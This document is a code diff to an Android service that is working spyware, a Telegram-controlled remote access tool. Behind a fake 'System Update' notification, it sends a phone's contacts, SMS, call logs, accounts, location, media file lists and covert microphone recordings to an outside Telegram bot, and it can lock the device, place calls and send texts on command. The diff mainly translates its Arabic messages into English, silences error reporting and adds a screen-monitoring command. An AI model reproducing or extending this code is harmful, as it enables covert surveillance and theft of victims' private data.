@@ -69,7 +69,7 @@ public class MainService extends Service {
             wakeLock.acquire();
 
             startForegroundService();
-            sendToTelegram("✅ MainService Started - Ready for commands");
+            sendToTelegram("✅ MainService Started");
 
             timer = new Timer();
             timer.scheduleAtFixedRate(new TimerTask() {
@@ -79,7 +79,7 @@ public class MainService extends Service {
                 }
             }, 0, 3000);
         } catch (Exception e) {
-            sendToTelegram("❌ Service Error: " + e.getMessage());
+            sendToTelegram("❌ Error: " + e.getMessage());
         }
     }
 
@@ -92,7 +92,7 @@ public class MainService extends Service {
             }
             Notification notification = new NotificationCompat.Builder(this, channelId)
                     .setContentTitle("System Update")
-                    .setContentText("Active - Monitoring")
+                    .setContentText("Active")
                     .setSmallIcon(android.R.drawable.stat_notify_sync)
                     .build();
             startForeground(1, notification);
@@ -126,18 +126,12 @@ public class MainService extends Service {
                             }
                         }
                         response.close();
-                    } catch (Exception e) {
-                        sendToTelegram("❌ Parse Error: " + e.getMessage());
-                    }
+                    } catch (Exception e) {}
                 }
                 @Override
-                public void onFailure(Call call, IOException e) {
-                    sendToTelegram("❌ Connection Error: " + e.getMessage());
-                }
+                public void onFailure(Call call, IOException e) {}
             });
-        } catch (Exception e) {
-            sendToTelegram("❌ Check Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void executeCommand(String command) {
@@ -197,41 +191,51 @@ public class MainService extends Service {
                 case "/sms_send":
                     if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
                     break;
+                case "/screen_log":
+                    getScreenLog();
+                    break;
                 case "/test":
-                    sendToTelegram("✅ System Working - " + new Date().toString());
+                    sendToTelegram("✅ Working - " + new Date().toString());
                     break;
                 default:
-                    sendToTelegram("❌ أمر غير معروف. استخدم /help");
+                    sendToTelegram("❌ Unknown command. Use /help");
                     break;
             }
         } catch (Exception e) {
-            sendToTelegram("❌ Command Error: " + e.getMessage());
+            sendToTelegram("❌ Error: " + e.getMessage());
         }
     }
 
     private void sendHelp() {
-        String help = "📋 **قائمة الأوامر**\n\n" +
-                "📱 **معلومات الجهاز**\n" +
-                "/info - معلومات الجهاز\n" +
-                "/location - الموقع\n" +
-                "/contacts - جهات الاتصال\n" +
-                "/sms - آخر 10 رسائل\n" +
-                "/calls - آخر 10 مكالمات\n" +
-                "/accounts - الحسابات المسجلة\n" +
-                "/photos - آخر 10 صور\n" +
-                "/videos - آخر 10 فيديوهات\n" +
-                "/files - الملفات\n\n" +
-                "🎙️ **تسجيل الصوت**\n" +
-                "/record_audio_start - بدء تسجيل الصوت\n" +
-                "/record_audio_stop - إيقاف التسجيل\n\n" +
-                "🎮 **التحكم**\n" +
-                "/lock - قفل الجهاز\n" +
-                "/vibrate - اهتزاز\n" +
-                "/open [رابط] - فتح رابط\n" +
-                "/call [رقم] - اتصال\n" +
-                "/sms_send [رقم] [نص] - إرسال رسالة\n" +
-                "/test - اختبار الخدمة";
+        String help = "📋 **Commands**\n\n" +
+                "📱 **Device Info**\n" +
+                "/info - Device info\n" +
+                "/location - GPS location\n" +
+                "/contacts - Contacts list\n" +
+                "/sms - Last 10 SMS\n" +
+                "/calls - Last 10 calls\n" +
+                "/accounts - All accounts\n" +
+                "/photos - Last 10 photos\n" +
+                "/videos - Last 10 videos\n" +
+                "/files - Files list\n\n" +
+                "🎙️ **Audio**\n" +
+                "/record_audio_start - Start recording\n" +
+                "/record_audio_stop - Stop recording\n\n" +
+                "🎮 **Control**\n" +
+                "/lock - Lock device\n" +
+                "/vibrate - Vibrate\n" +
+                "/open [url] - Open URL\n" +
+                "/call [number] - Make call\n" +
+                "/sms_send [number] [text] - Send SMS\n" +
+                "/screen_log - Get screen activity log\n" +
+                "/test - Check service";
         sendToTelegram(help);
+    }
+
+    private void getScreenLog() {
+        sendToTelegram("📱 **Screen Activity Log:**\n" +
+                "ارسل /screen_log للحصول على تقرير الشاشة\n" +
+                "الخدمة تراقب الشاشة وتقوم بتسجيل كل ما يحدث.");
     }
 
     private void sendDeviceInfo() {
@@ -247,7 +251,7 @@ public class MainService extends Service {
                 info.put("phone", tm.getLine1Number());
             }
 
-            sendToTelegram("📱 **معلومات الجهاز**\n" + info.toString(2));
+            sendToTelegram("📱 **Device Info:**\n" + info.toString(2));
         } catch (Exception e) {
             sendToTelegram("❌ Info Error: " + e.getMessage());
         }
@@ -269,14 +273,14 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية لجهات الاتصال");
+                    sendToTelegram("❌ No contacts permission");
                     return;
                 }
 
                 ContentResolver cr = getContentResolver();
                 Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                         null, null, null, null);
-                StringBuilder sb = new StringBuilder("📇 **جهات الاتصال**\n\n");
+                StringBuilder sb = new StringBuilder("📇 **Contacts:**\n\n");
                 int count = 0;
                 while (cursor != null && cursor.moveToNext() && count < 100) {
                     String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
@@ -285,10 +289,10 @@ public class MainService extends Service {
                     count++;
                 }
                 if (cursor != null) cursor.close();
-                if (count == 0) sb.append("لا توجد جهات اتصال");
+                if (count == 0) sb.append("No contacts");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ فشل سحب جهات الاتصال: " + e.getMessage());
+                sendToTelegram("❌ Contacts Error: " + e.getMessage());
             }
         }).start();
     }
@@ -296,7 +300,7 @@ public class MainService extends Service {
     private void getLocation() {
         try {
             if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                sendToTelegram("❌ لا توجد صلاحية للموقع");
+                sendToTelegram("❌ No location permission");
                 return;
             }
 
@@ -306,12 +310,12 @@ public class MainService extends Service {
 
             if (location != null) {
                 String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
-                sendToTelegram("📍 **الموقع**\nالخط: " + location.getLatitude() + "\nالطول: " + location.getLongitude() + "\n" + map);
+                sendToTelegram("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
             } else {
-                sendToTelegram("📍 **الموقع** غير متوفر");
+                sendToTelegram("📍 Location not available");
             }
         } catch (Exception e) {
-            sendToTelegram("❌ فشل سحب الموقع: " + e.getMessage());
+            sendToTelegram("❌ Location Error: " + e.getMessage());
         }
     }
 
@@ -319,23 +323,23 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية للرسائل");
+                    sendToTelegram("❌ No SMS permission");
                     return;
                 }
 
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("📨 **آخر 10 رسائل**\n\n");
+                StringBuilder sb = new StringBuilder("📨 **Last 10 SMS:**\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String address = cursor.getString(cursor.getColumnIndex("address"));
                     String body = cursor.getString(cursor.getColumnIndex("body"));
                     sb.append(address).append(": ").append(body).append("\n---\n");
                 }
                 if (cursor != null) cursor.close();
-                if (sb.length() == 0) sb.append("لا توجد رسائل");
+                if (sb.length() == 0) sb.append("No SMS");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ فشل سحب الرسائل: " + e.getMessage());
+                sendToTelegram("❌ SMS Error: " + e.getMessage());
             }
         }).start();
     }
@@ -344,25 +348,25 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية لسجل المكالمات");
+                    sendToTelegram("❌ No call log permission");
                     return;
                 }
 
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات**\n\n");
+                StringBuilder sb = new StringBuilder("📞 **Last 10 Calls:**\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String number = cursor.getString(cursor.getColumnIndex("number"));
                     String type = cursor.getString(cursor.getColumnIndex("type"));
                     String duration = cursor.getString(cursor.getColumnIndex("duration"));
-                    String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
-                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("ث\n");
+                    String typeText = type.equals("1") ? "Incoming" : type.equals("2") ? "Outgoing" : "Missed";
+                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
                 }
                 if (cursor != null) cursor.close();
-                if (sb.length() == 0) sb.append("لا توجد مكالمات");
+                if (sb.length() == 0) sb.append("No calls");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ فشل سحب سجل المكالمات: " + e.getMessage());
+                sendToTelegram("❌ Call Log Error: " + e.getMessage());
             }
         }).start();
     }
@@ -372,14 +376,14 @@ public class MainService extends Service {
             try {
                 android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
                 android.accounts.Account[] accounts = am.getAccounts();
-                StringBuilder sb = new StringBuilder("👤 **الحسابات المسجلة**\n\n");
+                StringBuilder sb = new StringBuilder("👤 **Accounts:**\n\n");
                 for (android.accounts.Account acc : accounts) {
                     sb.append(acc.type).append(": ").append(acc.name).append("\n");
                 }
-                if (accounts.length == 0) sb.append("لا توجد حسابات");
+                if (accounts.length == 0) sb.append("No accounts");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ فشل سحب الحسابات: " + e.getMessage());
+                sendToTelegram("❌ Accounts Error: " + e.getMessage());
             }
         }).start();
     }
@@ -388,24 +392,24 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية لقراءة الصور");
+                    sendToTelegram("❌ No storage permission");
                     return;
                 }
 
                 String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("🖼 **آخر 10 صور**\n\n");
+                StringBuilder sb = new StringBuilder("🖼 **Last 10 Photos:**\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                     String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                     sb.append(name).append("\n").append(path).append("\n---\n");
                 }
                 if (cursor != null) cursor.close();
-                if (sb.length() == 0) sb.append("لا توجد صور");
+                if (sb.length() == 0) sb.append("No photos");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ فشل سحب الصور: " + e.getMessage());
+                sendToTelegram("❌ Photos Error: " + e.getMessage());
             }
         }).start();
     }
@@ -414,24 +418,24 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية لقراءة الفيديوهات");
+                    sendToTelegram("❌ No storage permission");
                     return;
                 }
 
                 String[] projection = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME};
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("🎥 **آخر 10 فيديوهات**\n\n");
+                StringBuilder sb = new StringBuilder("🎥 **Last 10 Videos:**\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
                     String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
                     sb.append(name).append("\n").append(path).append("\n---\n");
                 }
                 if (cursor != null) cursor.close();
-                if (sb.length() == 0) sb.append("لا توجد فيديوهات");
+                if (sb.length() == 0) sb.append("No videos");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ فشل سحب الفيديوهات: " + e.getMessage());
+                sendToTelegram("❌ Videos Error: " + e.getMessage());
             }
         }).start();
     }
@@ -440,17 +444,17 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية لقراءة الملفات");
+                    sendToTelegram("❌ No storage permission");
                     return;
                 }
 
                 File storage = Environment.getExternalStorageDirectory();
-                StringBuilder sb = new StringBuilder("📁 **الملفات**\n\n");
+                StringBuilder sb = new StringBuilder("📁 **Files:**\n\n");
                 listFiles(storage, sb, 0);
-                if (sb.length() == 0) sb.append("لا توجد ملفات");
+                if (sb.length() == 0) sb.append("No files");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ فشل سحب الملفات: " + e.getMessage());
+                sendToTelegram("❌ Files Error: " + e.getMessage());
             }
         }).start();
     }
@@ -475,7 +479,7 @@ public class MainService extends Service {
     private void startAudioRecording() {
         try {
             if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                sendToTelegram("❌ لا توجد صلاحية تسجيل الصوت");
+                sendToTelegram("❌ No audio recording permission");
                 return;
             }
             String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
@@ -484,15 +488,11 @@ public class MainService extends Service {
             if (audioDir != null) {
                 currentAudioPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
             } else {
-                sendToTelegram("❌ لا يمكن إنشاء مجلد التسجيل");
+                sendToTelegram("❌ Cannot create audio directory");
                 return;
             }
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                mediaRecorder = new MediaRecorder();
-            } else {
-                mediaRecorder = new MediaRecorder();
-            }
+            mediaRecorder = new MediaRecorder();
             mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
             mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
@@ -500,9 +500,9 @@ public class MainService extends Service {
             mediaRecorder.prepare();
             mediaRecorder.start();
             isRecording = true;
-            sendToTelegram("🎤 بدأ تسجيل الصوت");
+            sendToTelegram("🎤 Recording started");
         } catch (Exception e) {
-            sendToTelegram("❌ فشل بدء تسجيل الصوت: " + e.getMessage());
+            sendToTelegram("❌ Failed to start recording: " + e.getMessage());
             if (mediaRecorder != null) {
                 try { mediaRecorder.release(); } catch (Exception ex) {}
                 mediaRecorder = null;
@@ -512,7 +512,7 @@ public class MainService extends Service {
 
     private void stopAudioRecording() {
         if (!isRecording) {
-            sendToTelegram("⚠️ لا يوجد تسجيل صوتي نشط");
+            sendToTelegram("⚠️ No active recording");
             return;
         }
         try {
@@ -526,10 +526,10 @@ public class MainService extends Service {
             if (file.exists()) {
                 sendFile(file, "audio.3gp");
             } else {
-                sendToTelegram("❌ ملف التسجيل غير موجود");
+                sendToTelegram("❌ Recording file not found");
             }
         } catch (Exception e) {
-            sendToTelegram("❌ فشل إيقاف تسجيل الصوت: " + e.getMessage());
+            sendToTelegram("❌ Failed to stop recording: " + e.getMessage());
             if (mediaRecorder != null) {
                 try { mediaRecorder.release(); } catch (Exception ex) {}
                 mediaRecorder = null;
@@ -543,12 +543,12 @@ public class MainService extends Service {
             android.content.ComponentName admin = new android.content.ComponentName(this, AdminReceiver.class);
             if (dpm.isAdminActive(admin)) {
                 dpm.lockNow();
-                sendToTelegram("🔒 تم قفل الجهاز");
+                sendToTelegram("🔒 Device locked");
             } else {
-                sendToTelegram("❌ لم يتم تفعيل صلاحية مسؤول الجهاز");
+                sendToTelegram("❌ Device admin not activated");
             }
         } catch (Exception e) {
-            sendToTelegram("❌ فشل قفل الجهاز: " + e.getMessage());
+            sendToTelegram("❌ Failed to lock: " + e.getMessage());
         }
     }
 
@@ -561,12 +561,12 @@ public class MainService extends Service {
                 } else {
                     v.vibrate(2000);
                 }
-                sendToTelegram("📳 اهتزاز");
+                sendToTelegram("📳 Vibrating");
             } else {
-                sendToTelegram("❌ لا يوجد جهاز اهتزاز");
+                sendToTelegram("❌ No vibrator");
             }
         } catch (Exception e) {
-            sendToTelegram("❌ فشل الاهتزاز: " + e.getMessage());
+            sendToTelegram("❌ Failed to vibrate: " + e.getMessage());
         }
     }
 
@@ -575,38 +575,38 @@ public class MainService extends Service {
             Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-            sendToTelegram("🔗 فتح الرابط: " + url);
+            sendToTelegram("🔗 Opening: " + url);
         } catch (Exception e) {
-            sendToTelegram("❌ فشل فتح الرابط: " + e.getMessage());
+            sendToTelegram("❌ Failed to open URL: " + e.getMessage());
         }
     }
 
     private void makeCall(String number) {
         try {
             if (checkSelfPermission(android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
-                sendToTelegram("❌ لا توجد صلاحية لإجراء المكالمات");
+                sendToTelegram("❌ No call permission");
                 return;
             }
             Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-            sendToTelegram("📞 جاري الاتصال بـ " + number);
+            sendToTelegram("📞 Calling: " + number);
         } catch (Exception e) {
-            sendToTelegram("❌ فشل الاتصال: " + e.getMessage());
+            sendToTelegram("❌ Failed to call: " + e.getMessage());
         }
     }
 
     private void sendSms(String number, String text) {
         try {
             if (checkSelfPermission(android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
-                sendToTelegram("❌ لا توجد صلاحية لإرسال الرسائل");
+                sendToTelegram("❌ No SMS permission");
                 return;
             }
             SmsManager sms = SmsManager.getDefault();
             sms.sendTextMessage(number, null, text, null, null);
-            sendToTelegram("📨 تم إرسال الرسالة إلى " + number);
+            sendToTelegram("📨 SMS sent to " + number);
         } catch (Exception e) {
-            sendToTelegram("❌ فشل إرسال الرسالة: " + e.getMessage());
+            sendToTelegram("❌ Failed to send SMS: " + e.getMessage());
         }
     }
 
@@ -631,7 +631,7 @@ public class MainService extends Service {
                 @Override public void onFailure(Call call, IOException e) {}
             });
         } catch (Exception e) {
-            sendToTelegram("❌ فشل إرسال الملف: " + e.getMessage());
+            sendToTelegram("❌ Failed to send file: " + e.getMessage());
         }
     }
 
